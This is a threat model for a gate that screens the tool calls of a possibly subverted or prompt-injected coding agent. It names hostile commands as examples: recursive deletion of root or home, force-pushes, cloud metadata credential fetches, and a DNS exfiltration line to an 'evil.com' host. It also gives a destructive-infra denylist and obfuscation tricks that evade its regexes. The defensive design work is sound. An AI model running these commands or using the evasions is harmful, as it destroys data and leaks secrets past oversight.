# Threat model

## What this defends

An autonomous coding agent with repo access that has been subverted (a prompt
injection in an issue or file it reads, a poisoned dependency, a jailbroken or
weak model) and issues destructive tool calls. The goal is to stop the actions
that do irreversible damage to a repository, while not blocking the agent's
legitimate build, test, and commit work.

## Attacker model

- The attacker controls the agent's *inputs* (content it reads) and therefore the
  *tool calls it proposes*. This is the realistic prompt-injection case.
- The attacker does **not** control the gate process, the guardrail source, or the
  HMAC key. If they do, all bets are off. See "Assumptions" below.

## In scope (enforced)

| # | Threat | Enforcement | Guarantee |
|---|---|---|---|
| T1 | Rewrite protected-branch history (force-push, hard-reset, rebase of `main`/`master`/`release`) via the structured git tool | symbolic git policy | machine-checked by z3: no admitted action rewrites protected history |
| T2 | Same via raw shell (`git push --force`, `git reset --hard`) | branch-parsed regex | heuristic; a rewrite naming no branch escalates to a human |
| T3 | Destroy the repo / home / root (`rm -rf .`, `rm -rf ~`, `rm -rf /`) | regex, scoped to repo/home/root targets | heuristic, high-precision |
| T4 | Exfiltrate a secret over the network (secret shape + curl/wget/nc **or DNS (dig/nslookup)** to a host) | regex | heuristic |
| T5 | Write a secret to disk (secret shape + redirect/tee, or a file write). Secret shapes include modern provider keys (`sk-proj-`, `sk-ant-`), AWS, GitHub, private keys | regex | heuristic |
| T6 | Disable CI (empty a `.github/workflows` file) | path + content | heuristic |
| T7 | Steal cloud credentials via the instance-metadata endpoint (`curl 169.254.169.254/...`, `metadata.google.internal`) — no secret in the command, so T4 alone missed it | regex, fetch-context scoped | heuristic, high-precision |
| T8 | Exfiltrate via DNS tunneling (a lookup whose name is built from a command substitution, `dig $(cat secret).evil.com`) | regex | heuristic |
| T9 | (opt-in `devops` preset) Catastrophic infra/data destruction with real cloud/db credentials: `terraform destroy`, `kubectl delete namespace/pvc`, cloud instance/cluster/bucket/db deletion, `redis-cli FLUSHALL`, `DROP DATABASE`, `dropdb`, `npm unpublish`, `wipefs` | opt-in regex denylist | heuristic, high-precision, off by default |

## Out of scope (by design, not policed)

- General code changes, refactors, mass `sed`, dependency installs (`curl | sh`).
  These are the agent's job and are caught by normal PR review, not here.
- Logic bugs or vulnerabilities the agent writes into code. That is CodeQL's job.
- Syscall-level isolation, resource exhaustion, network egress control. That is a
  sandbox's job (seccomp/gVisor). This gate is meant to run *in front of* one.
- Obfuscated shell that evades the T3-T5 regexes (`rm -r -f`, `$IFS`, base64,
  aliases). The heuristics raise the cost of an accident or a naive injection;
  they are not a boundary against a determined attacker at the shell.

## Assumptions (the guarantee depends on these)

1. **The gate is out-of-process from the agent.** It runs as a wrapper or service
   the agent cannot edit. An in-process import the agent controls is not a security
   boundary.
2. **The HMAC key is not readable by the agent.** The audit chain is tamper-evident
   only under this assumption.
3. **Tool calls are observable to the gate.** It only gates actions that flow
   through it; an agent with an out-of-band channel to the repo is not covered.

## Residual risk

Even under the assumptions, T2-T9 are heuristic and bypassable by obfuscation. The
only property proven end-to-end is that the *structured* git policy (T1) has no gap
that admits a protected-history rewrite. Everything else is precision-tuned
pattern matching. It is validated for low false-friction on real commands: the
reference corpus is 3,790 commands, and the expanded T1-T9 ruleset was re-confirmed
at **0 false blocks on the latest 2,848-command run** across 12 trusted popular
repos (rust, tokio, deno, ripgrep, ruff, flask, ...). It is not proven complete
against evasion. Deploy accordingly: defense in depth, in front of a sandbox, not
as the only control.
